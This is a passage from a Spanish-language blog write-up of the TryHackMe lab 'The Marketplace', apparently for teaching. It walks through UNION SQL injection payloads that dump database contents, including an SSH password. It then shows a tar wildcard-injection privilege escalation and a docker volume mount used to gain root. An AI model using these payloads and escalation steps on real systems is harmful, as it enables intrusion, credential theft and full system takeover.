y poner <code class="language-plaintext highlighter-rouge">-1</code> en cambio (<code class="language-plaintext highlighter-rouge">user=-1</code>) y asi dejar los cambios limpios para que nuestra otra tabla pase a tomar estas posiciones en la pagina:</p><blockquote><p><code class="language-plaintext highlighter-rouge">http://10.10.134.243/admin?user=-1 UNION SELECT 1,2,3,4;-- -</code></p></blockquote><p><img data-src="https://user-images.githubusercontent.com/85322110/148671621-da856103-20e6-44bd-9c51-476ef78e0afa.png" alt="image" data-proofer-ignore></p><p>En la imagen los valores luego del SELECT fueron cambiados a <code class="language-plaintext highlighter-rouge">...admin?user=-1 UNION SELECT 'a','b','c','d';-- -</code> para mostrar de mejor manera en que posiciones se introducen estos nuevos valores, con eso en mente, procederemos a inyectar valores dentro del cambio <code class="language-plaintext highlighter-rouge">'b'</code> o <code class="language-plaintext highlighter-rouge">2</code> para efectos practicos.</p><ul><li>Obtener nombres de bases de datos:</ul><p>Para leer especificamente los nombres de Bases de Datos en MySQL, existe una tabla en donde estos son almacenados en una base de datos interna por defecto llamada <code class="language-plaintext highlighter-rouge">information_schema</code> el cual tiene mucha informacion de interes para un atacante (mas <a href="https://mariadb.com/kb/en/information-schema-tables/">aqui</a>), especificamente buscamos el valor <code class="language-plaintext highlighter-rouge">schema_name</code> dentro de la tabla <code class="language-plaintext highlighter-rouge">schemata</code> de la base de datos <code class="language-plaintext highlighter-rouge">information_schema</code>, asi que procedemos a crear la siguiente consulta haciendo uso de la funcion <code class="language-plaintext highlighter-rouge">group_concat()</code> el cual nos lista multiples valores en uno solo separados por coma:</p><blockquote><p><code class="language-plaintext highlighter-rouge">http://10.10.134.243/admin?user=-1 UNION SELECT 1,group_concat(schema_name),3,4 FROM information_schema.schemata;-- -</code></p></blockquote><p><img data-src="https://user-images.githubusercontent.com/85322110/148672214-47fc90cb-2487-4958-a3f0-0ac6ceb86470.png" alt="image" data-proofer-ignore></p><p>Vemos que existen solo dos bases de datos, <code class="language-plaintext highlighter-rouge">information_schema</code> que siempre esta presente, y <code class="language-plaintext highlighter-rouge">marketplace</code> que es de nuestro interes</p><ul><li>Obtener nombres de tablas:</ul><p>Para seguir indagando hacia abajo, podemos leer los nombres de las tablas dentro de las bases de datos haciendo uso de la tabla <code class="language-plaintext highlighter-rouge">table_name</code> dentro de <code class="language-plaintext highlighter-rouge">information_schema</code> sabiendo que el <code class="language-plaintext highlighter-rouge">table_schema</code> es <code class="language-plaintext highlighter-rouge">marketplace</code>, por lo tanto preparamos la siguiente consulta:</p><blockquote><p><code class="language-plaintext highlighter-rouge">http://10.10.134.243/admin?user=-1 UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema='marketplace';-- -</code></p></blockquote><p><img data-src="https://user-images.githubusercontent.com/85322110/148672577-184335f3-8737-469c-9e0f-394a21ffb65e.png" alt="image" data-proofer-ignore></p><p>Esto nos devuelve tres tablas con <code class="language-plaintext highlighter-rouge">items</code>, <code class="language-plaintext highlighter-rouge">messages</code>, y <code class="language-plaintext highlighter-rouge">users</code></p><ul><li>Obtener nombres de atributos:</ul><p>En este caso nos enfocaremos en la tabla <code class="language-plaintext highlighter-rouge">messages</code> ya que al parecer es la unica que tiene informacion de interes. A continuacion buscaremos obtener los valores de <code class="language-plaintext highlighter-rouge">column_name</code> dentro de <code class="language-plaintext highlighter-rouge">information_schema</code> sabiendo que el <code class="language-plaintext highlighter-rouge">table_name</code> es <code class="language-plaintext highlighter-rouge">messages</code>, queda la siguiente consulta:</p><blockquote><p><code class="language-plaintext highlighter-rouge">http://10.10.134.243/admin?user=-1 UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='messages';-- -</code></p></blockquote><p><img data-src="https://user-images.githubusercontent.com/85322110/148672717-f95ef712-8c0d-44c7-a999-c63f55e17e55.png" alt="image" data-proofer-ignore></p><p>Esto nos devuelve los valores de <code class="language-plaintext highlighter-rouge">id</code>, <code class="language-plaintext highlighter-rouge">is_read</code>, <code class="language-plaintext highlighter-rouge">message_content</code>, <code class="language-plaintext highlighter-rouge">user_from</code>, <code class="language-plaintext highlighter-rouge">user_to</code>. Con esta informacion ya concluimos que nuestros valores de interes son <code class="language-plaintext highlighter-rouge">message_content</code>, <code class="language-plaintext highlighter-rouge">user_from</code>, <code class="language-plaintext highlighter-rouge">user_to</code> para los cuales intentaremos recuperar todos sus valores desde la tabla <code class="language-plaintext highlighter-rouge">messages</code> con la siguiente consulta:</p><blockquote><p><code class="language-plaintext highlighter-rouge">http://10.10.134.243/admin?user=-1 UNION SELECT 1,group_concat(user_from,0x3a,user_to,0x3a,message_content),3,4 FROM messages;-- -</code></p></blockquote><p><img data-src="https://user-images.githubusercontent.com/85322110/148672903-7d729616-0161-4130-9657-801163ff7f46.png" alt="image" data-proofer-ignore></p><p>Como vemos arriba, no hace falta especificar la base de datos ya que se asume estamos trabajando dentro de ella, de igual forma es valido poner el formato full con <code class="language-plaintext highlighter-rouge">marketplace.messages</code>, tambien hemos utilizado <code class="language-plaintext highlighter-rouge">0x3a</code> dentro de la instruccion <code class="language-plaintext highlighter-rouge">group_concat()</code> que representa el simbolo de dos puntos <code class="language-plaintext highlighter-rouge">:</code> en hexadecimal, para separar los diferentes valores que nos encontramos.</p><p>Con la informacion obtenida, vamos de vuelta a nuestra consola y utilizamos el paquete <code class="language-plaintext highlighter-rouge">tr ',' '\n'</code> para reemplazar las comas que se usan para separar los atributos en saltos de linea y sean mas facil de leer:</p><p><img data-src="https://user-images.githubusercontent.com/85322110/148673128-148e3ebf-0ac9-4e66-9511-f1b70102b27f.png" alt="image" data-proofer-ignore></p><p>Vemos que el usuario 1 (admin) le envio al usuario 3 (jake) una clave temporal de SSH que es <code class="language-plaintext highlighter-rouge">@b_ENXkGYUCAv3zJ</code>, la guardamos por si acaso</p><p><img data-src="https://user-images.githubusercontent.com/85322110/148673163-c77155f8-3094-4789-80c0-17b7195b580b.png" alt="image" data-proofer-ignore></p><p>Y al probar logearnos en SSH con esa clave, funciona perfecta</p><blockquote><p><code class="language-plaintext highlighter-rouge">ssh jake@10.10.134.243</code></p></blockquote><p><img data-src="https://user-images.githubusercontent.com/85322110/148673205-c9c6e411-1ab2-4c0c-86d5-4fade03aab73.png" alt="image" data-proofer-ignore></p><p>La IP de la maquina cambio pero el procedimiento sigue siendo el mismo, ya con esto se logra el acceso al server y tenemos nuestra <code class="language-plaintext highlighter-rouge">Flag</code> de <code class="language-plaintext highlighter-rouge">user.txt</code> que se encuentra dentro de <code class="language-plaintext highlighter-rouge">/home/jake/user.txt</code></p><p><img data-src="https://user-images.githubusercontent.com/85322110/148673256-1d167847-2b21-483c-bdd0-457293a0e1ca.png" alt="image" data-proofer-ignore></p><h2 id="escalada-de-privilegios">ESCALADA DE PRIVILEGIOS <a href="#escalada-de-privilegios" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Una vez dentro y logeados como <code class="language-plaintext highlighter-rouge">jake</code> aun no tenemos permisos de root por lo tanto nos falta aun la bandera <code class="language-plaintext highlighter-rouge">root.txt</code> que deberia estar dentro de <code class="language-plaintext highlighter-rouge">/root/</code>. Pasamos a revisar y nos damos cuenta que al ver los privilegios sudoers con <code class="language-plaintext highlighter-rouge">sudo -l</code> tenemos permisos como <code class="language-plaintext highlighter-rouge">michael</code> de ejecutar el script en bash <code class="language-plaintext highlighter-rouge">/opt/backups/backup.sh</code>, el cual haciendo un <code class="language-plaintext highlighter-rouge">cat</code> podemos ver su funcionamiento:</p><p><img data-src="https://user-images.githubusercontent.com/85322110/148673373-201bafb0-3be4-475a-a1c8-9def89e50327.png" alt="image" data-proofer-ignore></p><p>Vemos que el script usa el comando <code class="language-plaintext highlighter-rouge">tar</code> para comprimir todos los archivos del sistema usando el <em>wildcard</em> <code class="language-plaintext highlighter-rouge">*</code>, este <em>wildcard</em> supone un riesgo de seguridad, debido a que si lee todos los archivos, si un archivo tiene de nombre una opcion de comando (ejemplo: un archivo llamado <code class="language-plaintext highlighter-rouge">--help</code>), el programa en vez de leerlo como archivo, lo ejecuta como opcion adicional de sus propios argumentos. Esto se conoce como <code class="language-plaintext highlighter-rouge">Wildcard Injection</code>.</p><p>Segun <a href="https://gtfobins.github.io/gtfobins/tar/">GTFOBins - tar</a> podemos explotar esta vulnerabilidad si añadimos <code class="language-plaintext highlighter-rouge">--checkpoint=1 --checkpoint-action=exec=bash</code> como argumentos de un comando <code class="language-plaintext highlighter-rouge">tar</code>, en este caso debemos crear dos archivos llamados <code class="language-plaintext highlighter-rouge">--checkpoint=1</code> y <code class="language-plaintext highlighter-rouge">--checkpoint-action=exec=bash</code> en un directorio donde tengamos permisos</p><p><img data-src="https://user-images.githubusercontent.com/85322110/148673567-bc92e24f-7ea8-415a-9b6e-6d3f5fe8cf34.png" alt="image" data-proofer-ignore></p><p>Como vemos existen varias formas de crear archivos que empiecen con guiones. Una vez creados estos archivos, pasamos a ejecutar el script en bash a ver si obtenemos una consola con privilegios de <code class="language-plaintext highlighter-rouge">michael</code>:</p><p><img data-src="https://user-images.githubusercontent.com/85322110/148673633-a90036c2-5129-474f-9797-d31a142c3207.png" alt="image" data-proofer-ignore></p><p>Efectivamente al ejecutar el comando haciendo uso de la opcion <code class="language-plaintext highlighter-rouge">-u michael</code> para que el <code class="language-plaintext highlighter-rouge">sudo</code> lo haga como <code class="language-plaintext highlighter-rouge">michael</code> y no como <code class="language-plaintext highlighter-rouge">root</code> (que igual no tenemos permisos) obtenemos una consola con el usuario de <code class="language-plaintext highlighter-rouge">michael</code>, y justamente al ver su <code class="language-plaintext highlighter-rouge">id</code> vemos que pertenece al grupo de <code class="language-plaintext highlighter-rouge">docker</code>.</p><p>Aca nuevamente segun <a href="https://gtfobins.github.io/gtfobins/docker/">GTFOBins - docker</a> podemos aprovecharnos de estar adentro del grupo de <code class="language-plaintext highlighter-rouge">docker</code> para crear un contenedor y poder montar dentro de el los archivos que no podriamos leer aun debido a falta de permisos, para ello primero vemos que imagenes existen instaladas para los contenedores con:</p><blockquote><p><code class="language-plaintext highlighter-rouge">docker images</code> <img data-src="https://user-images.githubusercontent.com/85322110/148673778-4a21b1de-a20d-48bc-9ee0-25057debc687.png" alt="image" data-proofer-ignore></p></blockquote><p>Y vemos que existe la imagen <code class="language-plaintext highlighter-rouge">alpine</code> que es un entorno muy ligero y nos puede servir perfectamente para lo que se necesita. Ultimadamente vamos a montar un <code class="language-plaintext highlighter-rouge">docker</code> con las siguientes opciones:</p><blockquote><p><code class="language-plaintext highlighter-rouge">docker run -v /:/mnt --rm -it alpine chroot sh</code></p></blockquote><p>Que con uso de la funcion <code class="language-plaintext highlighter-rouge">run</code> montara el <code class="language-plaintext highlighter-rouge">docker alpine</code> de modo interactivo <code class="language-plaintext highlighter-rouge">-it</code>, creando el volumen <code class="language-plaintext highlighter-rouge">-v</code> metiendo todo lo que esta en <code class="language-plaintext highlighter-rouge">/</code> dentro <code class="language-plaintext highlighter-rouge">:</code> de <code class="language-plaintext highlighter-rouge">/mnt</code>, removera el docker una vez salgamos con <code class="language-plaintext highlighter-rouge">--rm</code> y finalmente ejecutara el comando <code class="language-plaintext highlighter-rouge">sh</code> el cual nos da una shell.</p><p><img data-src="https://user-images.githubusercontent.com/85322110/148673901-b30a24a3-e5c1-46ef-af32-500ca85c2f47.png" alt="image" data-proofer-ignore></p><p>Con esto hemos entrado dentro del <code class="language-plaintext highlighter-rouge">docker alpine</code> y tenemos permisos de usuario root dentro de este entorno, sin embargo notamos que no estan los archivos de la maquina, y en /root/ no hay nada, esto pasa porque hemos de recordar que el sistema de archivos de <code class="language-plaintext highlighter-rouge">/</code> lo hemos montado dentro de <code class="language-plaintext highlighter-rouge">/mnt/</code></p><p><img data-src="https://user-images.githubusercontent.com/85322110/148673996-ee84585d-de18-4133-8fc6-a0e4f504dcff.png" alt="image" data-proofer-ignore></p><p>Con esto finalmente logramos la bandera de <code class="language-plaintext highlighter-rouge">root.txt</code> y hemos efectivamente completado esta maquina a traves de <code class="language-plaintext highlighter-rouge">XSS</code>, <code class="language-plaintext highlighter-rouge">XSRF</code>, <code class="language-plaintext highlighter-rouge">SQL Injection</code> y <code class="language-plaintext highlighter-rouge">Wildcard Injection</code>.</p><p>Se espera que los conceptos presentes en esta maquinas hayan sido explicados correctamente y se puedan entender los procedimientos para explotar las vulnerabilidades presentes en <code class="language-plaintext highlighter-rouge">The Marketplace</code>, muchisimas gracias por tomarse el tiempo de leer este <code class="language-plaintext highlighter-rouge">Writeup</code> y se le invita a estar pendiente para nuevas guias.</p><p>Saludos!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/cajas/'>cajas</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/thm/" class="post-tag no-text-decoration" >thm</a> <a href="/tags/xss/" class="post-tag no-text-decoration" >xss</a> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a> <a href="/tags/docker/" class="post-tag no-text-decoration" >docker</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> Este post esta bajo la licencia <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> por el autor.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Compartir</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=The Marketplace - THM Writeup - Rich J. Celedon&url=https://rjceledon.github.io/posts/the-marketplace-thm-writeup/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=The Marketplace - THM Writeup - Rich J. Celedon&u=https://rjceledon.github.io/posts/the-marketplace-thm-writeup/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=The Marketplace - THM Writeup - Rich J. Celedon&url=https://rjceledon.github.io/posts/the-marketplace-thm-writeup/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copiar link" title-succeed="Link copiado satisfactoriamente!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Actualizado Recientemente</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/the-marketplace-thm-writeup/">The Marketplace - THM Writeup</a><li><a href="/posts/brainpan-thm-writeup/">Brainpan 1 - THM Writeup</a><li><a href="/posts/blog-thm-writeup/">Blog - THM Writeup</a></ul></div><div id="access-tags"><div class="panel-heading">Tags Populares</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/thm/">thm</a> <a class="post-tag" href="/tags/reversing/">reversing</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/bof/">bof</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/escape/">escape</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/wordpress/">wordpress</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contenidos</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Seguir Leyendo</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/blog-thm-writeup/"><div class="card-body"> <em class="timeago small" date="2022-01-14 22:34:00 +0000" >14 Jan, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Blog - THM Writeup</h3><div class="text-muted small"><p> Hoy traemos la maquina Blog de TryHackMe en donde segun su misma descripcion indica que esta usando el Sistema de Gestion de Contenido (CMS) muy conocido WordPress el cual tambien tiene una lista...</p></div></div></a></div><div class="card"> <a href="/posts/brainpan-thm-writeup/"><div class="card-body"> <em class="timeago small" date="2022-01-12 14:22:30 +0000" >12 Jan, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Brainpan 1 - THM Writeup</h3><div class="text-muted small"><p> El dia de hoy se presenta una guia o writeup sobre una maquina interesante en la plataforma de TryHackMe la cual segun su propia descripcion indica que se hara un analisis de una vulnerabilidad p...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <span class="btn btn-outline-primary disabled" prompt="Mas viejo"><p>-</p></span> <a href="/posts/brainpan-thm-writeup/" class="btn btn-outline-primary" prompt="Mas nuevo"><p>Brainpan 1 - THM Writeup</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/">Rich J. Celedon</a>. <span data-toggle="tooltip" data-placement="top" title="Excepto cuando se señale lo contrario, los posts del blog de este sitio estan licenciados bajo Creative Commons Attribution 4.0 International (CC BY 4.0) Licenciado por el autor.">Ciertos derechos reservados.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Tags Populares</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/thm/">thm</a> <a class="post-tag" href="/tags/reversing/">reversing</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/bof/">bof</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/escape/">escape</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/wordpress/">wordpress</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No se hallaron resultados.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script>
